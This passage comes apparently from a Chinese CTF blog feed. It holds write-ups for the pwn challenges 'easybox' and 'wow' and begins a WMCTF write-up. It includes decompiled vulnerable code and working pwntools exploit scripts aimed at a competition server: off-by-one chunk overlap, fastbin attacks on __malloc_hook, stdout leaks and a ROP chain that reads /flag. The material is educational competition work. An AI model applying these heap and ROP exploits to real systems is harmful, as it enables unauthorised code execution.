class="string">"failed"</span>)</span><br><span class="line">        p.close()</span><br><span class="line">        p = remote(<span class="string">'101.200.53.148'</span>, <span class="number">15423</span>)</span><br><span class="line">        <span class="comment"># p = process(argv=[_proc], env=_setup_env())</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">"success"</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">11</span>, p64(libc_base + main_arena_offset + <span class="number">0x58</span>) * <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># uaf</span></span><br><span class="line">add(<span class="number">80</span>, <span class="number">0x68</span>, <span class="string">"AAAA"</span>) <span class="comment"># chunk 12</span></span><br><span class="line">delete(<span class="number">12</span>)</span><br><span class="line">edit(<span class="number">12</span>, p64(__malloc_hook - <span class="number">0x23</span>))</span><br><span class="line">add(<span class="number">80</span>, <span class="number">0x68</span>, <span class="string">"BBBB"</span>) <span class="comment"># chunk 13</span></span><br><span class="line">add(<span class="number">80</span>, <span class="number">0x68</span>, <span class="string">"CCCC"</span>) <span class="comment"># chunk 14</span></span><br><span class="line">edit(<span class="number">14</span>, <span class="string">'\x00'</span> * <span class="number">0x13</span> + p64(one_gadget))</span><br><span class="line"></span><br><span class="line"><span class="comment"># trigger</span></span><br><span class="line">p.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">"1"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"please answer the question"</span>, str(<span class="number">80</span>))</span><br><span class="line">p.sendlineafter(<span class="string">'______?'</span>, str(<span class="number">0x38</span>))</span><br><span class="line"></span><br><span class="line">success(<span class="string">"libc_base: "</span> + hex(libc_base))</span><br><span class="line">success(<span class="string">"one_gadget: "</span> + hex(one_gadget))</span><br><span class="line">p.sendline(token)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li></ol><h1 id="easybox"><a href="#easybox" class="headerlink" title="easybox"></a>easybox</h1><p>思路和上一题一样。</p><ol><li><p>两个功能：</p><ul><li><p><code>add</code>：</p>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">      <span class="keyword">unsigned</span> __int64 v1; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">      <span class="keyword">unsigned</span> __int64 <span class="built_in">size</span>; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">      <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">      v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"idx:"</span>);</span><br><span class="line">      v1 = choice();</span><br><span class="line">      <span class="keyword">if</span> ( v1 &gt; <span class="number">0xF</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"error."</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"len:"</span>);</span><br><span class="line">      <span class="built_in">size</span> = choice();</span><br><span class="line">      <span class="keyword">if</span> ( <span class="built_in">size</span> &gt; <span class="number">0xFFF</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"error."</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      chunk_size[v1] = <span class="built_in">size</span> + <span class="number">1</span>;</span><br><span class="line">      chunk_array[v1] = <span class="built_in">malloc</span>(<span class="built_in">size</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"content:"</span>);</span><br><span class="line">      <span class="built_in">read</span>(<span class="number">0</span>, chunk_array[v1], chunk_size[v1]);</span><br><span class="line">      <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  直接就是一个off by one。</p></li><li><p><code>delete</code>：</p>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v1; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"idx:"</span>);</span><br><span class="line">  v1 = choice();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">0xF</span> || !chunk_array[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"error."</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">free</span>(chunk_array[v1]);</span><br><span class="line">  chunk_array[v1] = <span class="number">0L</span>L;</span><br><span class="line">  chunk_size[v1] = <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  删得很彻底。</p></li></ul></li><li><p>直接利用off by one，构造chunk overlap，因为没有<code>show</code>，所以同样使得同一个chunk同时存在于unsorted bin和fastbin（<code>size = 0x70</code>）中，这样<code>fastbin-&gt;fd = main_arena + 0x58</code>；然后partial write，bruteforce，write stdout， leak。</p></li><li><p>然后再利用chunk overlap，fastbin attack打<code>__malloc_hook</code>为<code>onegadget</code>即可。</p></li><li><p>exp仅供参考：</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">p = remote(<span class="string">'101.200.53.148'</span>, <span class="number">34521</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx, len, content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;&gt;&gt;"</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"idx:"</span>, str(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">"len:"</span>, str(len))</span><br><span class="line">    p.sendafter(<span class="string">"content:"</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;&gt;&gt;"</span>, <span class="string">"2"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"idx:"</span>, str(idx))</span><br><span class="line"></span><br><span class="line">stdout_offset = <span class="number">0x3c5620</span></span><br><span class="line">__malloc_hook_offset = libc.sym[<span class="string">"__malloc_hook"</span>]</span><br><span class="line">one_gadget_offset = <span class="number">0xf1207</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># chunk overlap</span></span><br><span class="line">        add(<span class="number">0</span>, <span class="number">0x28</span>, <span class="string">"AAAA"</span>)</span><br><span class="line">        add(<span class="number">1</span>, <span class="number">0x28</span>, <span class="string">"BBBB"</span>)</span><br><span class="line">        delete(<span class="number">0</span>)</span><br><span class="line">        add(<span class="number">2</span>, <span class="number">0x68</span>, <span class="string">"CCCC"</span>)</span><br><span class="line">        delete(<span class="number">2</span>)</span><br><span class="line">        add(<span class="number">0</span>, <span class="number">0x28</span>, <span class="string">"A"</span> * <span class="number">0x28</span> + <span class="string">"\xa1"</span>)</span><br><span class="line">        add(<span class="number">3</span>, <span class="number">0x28</span>, <span class="string">"DDDD"</span>)</span><br><span class="line">        delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># partial write</span></span><br><span class="line">        add(<span class="number">1</span>, <span class="number">0x28</span>, <span class="string">"B"</span> * <span class="number">0x28</span> + <span class="string">"\x61"</span>)</span><br><span class="line">        delete(<span class="number">1</span>)</span><br><span class="line">        add(<span class="number">4</span>, <span class="number">0x58</span>, p64(stdout_offset - <span class="number">0x43</span>)[:<span class="number">2</span>])</span><br><span class="line">        add(<span class="number">1</span>, <span class="number">0x28</span>, <span class="string">"B"</span> * <span class="number">0x28</span> + <span class="string">"\x71"</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># leak</span></span><br><span class="line">        add(<span class="number">5</span>, <span class="number">0x68</span>, <span class="string">"EEEE"</span>)</span><br><span class="line">        add(<span class="number">6</span>, <span class="number">0x68</span>, <span class="string">"\x00"</span> * <span class="number">0x33</span> + p64(<span class="number">0xfbad1800</span>) + p64(<span class="number">0</span>) * <span class="number">3</span> + <span class="string">"\x00"</span>)</span><br><span class="line">        p.recvline()</span><br><span class="line">        p.recv(<span class="number">0x40</span>)</span><br><span class="line">        libc_base = u64(p.recv(<span class="number">8</span>)) - <span class="number">0x3c5600</span></span><br><span class="line">        __malloc_hook = libc_base + __malloc_hook_offset</span><br><span class="line">        one_gadget = libc_base + one_gadget_offset</span><br><span class="line"></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">"Failed"</span>)</span><br><span class="line">        p.close()</span><br><span class="line">        p = remote(<span class="string">'101.200.53.148'</span>, <span class="number">34521</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">"Success"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># chunk overlap</span></span><br><span class="line">add(<span class="number">7</span>, <span class="number">0x28</span>, <span class="string">"AAAA"</span>)</span><br><span class="line">add(<span class="number">8</span>, <span class="number">0x28</span>, <span class="string">"BBBB"</span>)</span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">add(<span class="number">9</span>, <span class="number">0x68</span>, <span class="string">"CCCC"</span>)</span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line">add(<span class="number">7</span>, <span class="number">0x28</span>, <span class="string">"A"</span> * <span class="number">0x28</span> + <span class="string">"\xa1"</span>)</span><br><span class="line">add(<span class="number">10</span>, <span class="number">0x28</span>, <span class="string">"DDDD"</span>)</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># __malloc_hook</span></span><br><span class="line">add(<span class="number">8</span>, <span class="number">0x38</span>, <span class="string">"E"</span> * <span class="number">0x28</span> + p64(<span class="number">0x71</span>) + p64(__malloc_hook - <span class="number">0x23</span>))</span><br><span class="line">add(<span class="number">9</span>, <span class="number">0x68</span>, <span class="string">"FFFF"</span>)</span><br><span class="line">add(<span class="number">11</span>, <span class="number">0x68</span>, <span class="string">"G"</span> * <span class="number">0x13</span> + p64(one_gadget))</span><br><span class="line"></span><br><span class="line"><span class="comment"># trigger</span></span><br><span class="line">p.sendlineafter(<span class="string">"&gt;&gt;&gt;"</span>, <span class="string">"1"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"idx:"</span>, str(<span class="number">12</span>))</span><br><span class="line">p.sendlineafter(<span class="string">"len:"</span>, str(<span class="number">0x48</span>))</span><br><span class="line"></span><br><span class="line">success(<span class="string">"libc_base: "</span> + hex(libc_base))</span><br><span class="line">success(<span class="string">"__malloc_hook: "</span> + hex(__malloc_hook))</span><br><span class="line">success(<span class="string">"one_gadget: "</span> + hex(one_gadget))</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">"token"</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li></ol><h1 id="wow"><a href="#wow" class="headerlink" title="wow"></a>wow</h1><p>主要就是逆向这个binary，搞清楚逻辑后难度就降低了。</p><ol><li><p>主要就是程序在栈上开辟了一块0x400的地址作为虚拟栈，然后指令就是<code>~@#$^&amp;|*{}</code>这几个，前面的几个很容易看出来就是对虚拟栈进行一些基本的操作，主要是后面这两个<code>{}</code>，队友说是像一些红黑树（实际上后来发现并不重要），重点在于：</p><ul><li><code>{</code>和<code>}</code>可以理解为条件跳转指令，如果当前虚拟栈上的值不为0，那么<code>{}</code>中间的指令就会得到执行。</li><li>执行到<code>}</code>的时候，同样检查虚拟栈上的值不为0的话，就会重新跳回<code>{</code>执行，相当于一个循环操作（这里可以解释为什么<code>~{}</code>指令会造成程序死循环了）。</li></ul></li><li><p>之后在这个基础上，尝试输入一些payload，发现<code>~{@~}</code>会打印出”\xFF\xFF\xFF\xFF”（在没有aslr的情况下），由于程序中打印code用的就是一个<code>code_buf</code>指针，这里显然是指针被改了。</p></li><li><p>调试后发现，原因在于执行过程中，存在一个1 byte溢出，将虚拟栈后面的指针低字节给覆盖了，而这个指针，正好就是指向输入的指令；那么，此时相当于我们可以修改指令buf的位置，向栈上附近的位置写入任意值。</p></li><li><p>同时可以发现：</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0L</span>L, &amp;tmp, <span class="number">1L</span>L);</span><br><span class="line">    chr = tmp;</span><br><span class="line">    <span class="keyword">if</span> ( tmp == <span class="number">10</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    index = len;</span><br><span class="line">    len_inc = len + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( code_buf == (__int64 *)&amp;code )</span><br><span class="line">      v11 = <span class="number">15L</span>L;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v11 = code;</span><br><span class="line">    <span class="keyword">if</span> ( len_inc &gt; v11 )</span><br><span class="line">     <span class="built_in">realloc</span>(&amp;code_buf, len, <span class="number">0L</span>L, <span class="number">0L</span>L, <span class="number">1L</span>L);</span><br><span class="line">    *((_BYTE *)code_buf + index) = chr;</span><br><span class="line">    len = len_inc;</span><br><span class="line">    *((_BYTE *)code_buf + index + <span class="number">1</span>) = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 这里因为<code>code_buf</code>被改了，造成<code>code_buf == (__int64 *)&amp;code</code>没有满足，<code>v11</code>就被赋值为上一次输入的指令值了，也就是说就是一个很大的值，从而<code>realloc</code>不会因为指令的长度超过15而被调用从而将<code>code_buf</code>指向heap上。</p></li><li><p>因此，利用的思路就很清晰了，就是利用溢出将<code>code_buf</code>指向<code>return address</code>，然后写入orw的rop拿flag，但是需要注意的，避开地址包含有效指令的gadget（或者进行计算）。</p></li><li><p>这样rop打return address后发现还是会crash，其实程序还有个检查<code>code_buf</code>的位置：</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( code_buf != (__int64 *)&amp;code )</span><br><span class="line">sub_405C90((__int64)code_buf);</span><br></pre></td></tr></table></figure><p> 也就是说要绕过这个check，还必须将<code>code_buf</code>改回来，那么其实可以在rop的末尾添加指令改回来即可（因为解析指令的时候如果遇到非指令字符是会跳过的）。</p></li><li><p>改回来后再触发rop即可。</p></li><li><p><code>exp</code>仅供参考：</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">p = remote(<span class="string">'101.200.53.148'</span>, <span class="number">15324</span>)</span><br><span class="line"></span><br><span class="line">syscall = <span class="number">0x00000000004dc054</span> <span class="comment"># syscall ; ret</span></span><br><span class="line">pop_rdi = <span class="number">0x000000000041307a</span> <span class="comment"># pop rdi ; pop ...; ret</span></span><br><span class="line">pop_rsi = <span class="number">0x000000000047383d</span> <span class="comment"># pop rsi ; pop ...; ret</span></span><br><span class="line">pop_rdx = <span class="number">0x000000000053048b</span> <span class="comment"># pop rdx ; pop ...; ret</span></span><br><span class="line">pop_rax = <span class="number">0x000000000053048a</span> <span class="comment"># pop rax ; pop ...; pop ...; ret</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">call</span><span class="params">(rax, rdi=<span class="number">0</span>, rsi=<span class="number">0</span>, rdx=<span class="number">0</span>)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> flat([pop_rax, rax, <span class="number">0</span>, <span class="number">0</span>, pop_rdi, rdi, <span class="number">0</span>, pop_rsi, rsi, <span class="number">0</span>, pop_rdx, rdx, <span class="number">0</span>, syscall])</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"enter your code:\n"</span>, <span class="string">"~&#123;@&amp;$&#125;"</span>)</span><br><span class="line">p.send(<span class="string">"A"</span> * <span class="number">0x3FF</span>)</span><br><span class="line">p.recvuntil(<span class="string">"\nrunning....\n"</span>)</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">p.recvuntil(<span class="string">"\x00"</span> * <span class="number">0x3FF</span>)</span><br><span class="line">val = ord(p.recv(<span class="number">1</span>))</span><br><span class="line">p.send(chr((val + <span class="number">0x58</span>) &amp; <span class="number">0xFF</span>))</span><br><span class="line">p.sendafter(<span class="string">"continue?"</span>, <span class="string">"Y"</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">payload = call(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0x5D3700</span>, <span class="number">0x10</span>)</span><br><span class="line">payload += call(<span class="number">2</span>, <span class="number">0x5D3700</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">payload += call(<span class="number">0</span>, <span class="number">3</span>, <span class="number">0x5D3700</span> + <span class="number">0x10</span>, <span class="number">0x50</span>)</span><br><span class="line">payload += call(<span class="number">1</span>, <span class="number">1</span>, <span class="number">0x5D3700</span> + <span class="number">0x10</span>, <span class="number">0x50</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"enter your code:\n"</span>, payload + <span class="string">"~&#123;@&amp;$&#125;"</span>)</span><br><span class="line">p.send(<span class="string">"A"</span> * <span class="number">0x3FF</span>)</span><br><span class="line">p.send(chr(val))</span><br><span class="line">p.sendafter(<span class="string">"continue?"</span>, <span class="string">"N"</span>)</span><br><span class="line">p.send(<span class="string">"/flag\x00"</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文首发于安全客：&lt;a href=&quot;https://www.anquanke.com/post/id/215100&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.anquanke.com/post/id/215100&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;pwn题全都没给libc，不过好在nofree那道题搞出来之后直接查出来libc的版本，后面就轻松很多了。wow这道题搞了很久，主要代码太长看得有点心累，再看解出题的队伍蛮多的就死磕了。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Competition" scheme="https://n0nop.github.io/categories/Competition/"/>
    
    
      <category term="CTF" scheme="https://n0nop.github.io/tags/CTF/"/>
    
      <category term="pwn" scheme="https://n0nop.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>WMCTF 部分pwn题解</title>
    <link href="https://n0nop.github.io/2020/08/08/WMCTF-%E9%83%A8%E5%88%86pwn%E9%A2%98%E8%A7%A3/"/>
    <id>https://n0nop.github.io/2020/08/08/WMCTF-%E9%83%A8%E5%88%86pwn%E9%A2%98%E8%A7%A3/</id>
    <published>2020-08-07T16:10:27.000Z</published>
    <updated>2020-12-03T03:35:06.258Z</updated>
    
    <content type="html"><![CDATA[<p>本文首发于安全客：<a href="https://www.anquanke.com/post/id/212563" target="_blank" rel="noopener">https://www.anquanke.com/post/id/212563</a></p><p>两天摸了三个pwn，剩下的cfgo-LuckyMaze，IDA反编译出来的代码实在太难看了，水平有限；baby_mac确实有相关的分析文章，无奈没有环境只能放弃。剩下三个好好总结一下。</p><a id="more"></a><h1 id="mengyedekending"><a href="#mengyedekending" class="headerlink" title="mengyedekending"></a>mengyedekending</h1><h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><ol><li><p>题目给了一个baby_Cat.exe以及一大堆dll，直接IDA分析baby_Cat.exe会发现找不到什么明显的逻辑，但是可以从一些类似字符串信息比如：</p><p><img src="/2020/08/08/WMCTF-%E9%83%A8%E5%88%86pwn%E9%A2%98%E8%A7%A3/image-20200803094211088.png" alt="image-20200803094211088"></p><p>可以猜测出这个exe实际上是在加载dll，程序主要的逻辑就在加载的dll中执行。</p></li><li><p>查看题目给的一堆dll中，会发现exe同名的baby_Cat.dll，用dnSpy x86反编译，成功定位到关键函数：</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">unsafe</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="keyword">string</span>[] args</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* ptr = <span class="keyword">stackalloc</span> <span class="keyword">char</span>[(UIntPtr)<span class="number">100</span>];</span><br><span class="line">    <span class="keyword">int</span> num = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span>* ptr2 = (<span class="keyword">int</span>*)(ptr + <span class="number">50</span>);</span><br><span class="line">    Program @<span class="keyword">object</span> = <span class="keyword">new</span> Program();</span><br><span class="line">    Program.MsgHandler msgHandler = <span class="keyword">new</span> Program.MsgHandler(@<span class="keyword">object</span>.Right);</span><br><span class="line">    Program.MsgHandler msgHandler2 = <span class="keyword">new</span> Program.MsgHandler(@<span class="keyword">object</span>.Backdoor);</span><br><span class="line">    Console.WriteLine(<span class="string">"This is a gift for you : &#123;0:x4&#125;"</span>, &amp;num);</span><br><span class="line">    Console.WriteLine(<span class="string">"What do you want me to repeat?"</span>);</span><br><span class="line">    ptr2[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    ptr2[<span class="number">2</span>] = ptr;</span><br><span class="line">    *ptr2 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (ptr2[<span class="number">1</span>] &lt; <span class="number">53</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">char</span> c = (<span class="keyword">char</span>)Console.Read();</span><br><span class="line">        <span class="keyword">bool</span> flag = c == <span class="string">'\n'</span>;</span><br><span class="line">        <span class="keyword">if</span> (flag)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">bool</span> flag2 = c == <span class="string">'\r'</span>;</span><br><span class="line">        <span class="keyword">if</span> (!flag2)</span><br><span class="line">        &#123;</span><br><span class="line">            ptr[*ptr2] = c;</span><br><span class="line">            ptr2[<span class="number">1</span>]++;</span><br><span class="line">        &#125;</span><br><span class="line">        (*ptr2)++;</span><br><span class="line">    &#125;</span><br><span class="line">    Console.WriteLine(<span class="string">"Do you want to change your input?"</span>);</span><br><span class="line">    <span class="keyword">char</span> c2 = (<span class="keyword">char</span>)Console.Read();</span><br><span class="line">    <span class="keyword">bool</span> flag3 = c2 == <span class="string">'N'</span> || c2 == <span class="string">'n'</span>;</span><br><span class="line">    <span class="keyword">if</span> (flag3)</span><br><span class="line">    &#123;</span><br><span class="line">        msgHandler(ptr);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        Console.WriteLine(<span class="string">"Please tell me a offset!"</span>);</span><br><span class="line">        <span class="keyword">char</span>* ptr3 = ptr2[<span class="number">2</span>];</span><br><span class="line">        Console.ReadLine();</span><br><span class="line">        <span class="keyword">int</span> num2 = Console.Read();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; num2; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">char</span>* ptr4 = ptr3 + i;</span><br><span class="line">            *ptr4 -= <span class="string">'\u0001'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">bool</span> flag4 = num == <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (flag4)</span><br><span class="line">        &#123;</span><br><span class="line">            msgHandler(ptr);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            msgHandler2(ptr);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span 